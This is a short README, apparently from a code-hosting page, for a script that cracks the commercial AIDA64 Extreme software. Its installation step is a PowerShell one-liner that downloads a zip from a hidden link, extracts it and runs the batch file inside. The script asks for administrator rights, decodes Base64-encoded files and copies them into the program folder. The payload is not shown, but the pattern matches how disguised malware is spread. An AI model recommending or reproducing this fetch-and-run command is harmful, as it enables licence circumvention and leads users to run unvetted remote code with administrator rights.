# **AIDA64 Extreme Activation Script**

This script simplifies the process of activating AIDA64 Extreme by automating the activation process with a single click. It includes features for copying necessary files and handling administrative privileges.

## 💪 Features

- Base64 Decoding: Decodes Base64-encoded files required for activation.
- Administrative Privileges: Requests elevation to run the script with administrative privileges.
- File Operations: Copies necessary files to the AIDA64 Extreme installation directory.
- Interactive: Provides a simple menu for user interaction and options.

## 🛠️ Installation

1. **Open PowerShell**

2. Run the following command in PowerShell to download and execute the activation script:


2. Run the following command in PowerShell to download and execute the activation script:

   ```powershell
   irm [link] -OutFile v1.3.zip; Expand-Archive v1.3.zip -DestinationPath . -Force; cmd.exe /c .\v1.3\script.bat
   ```
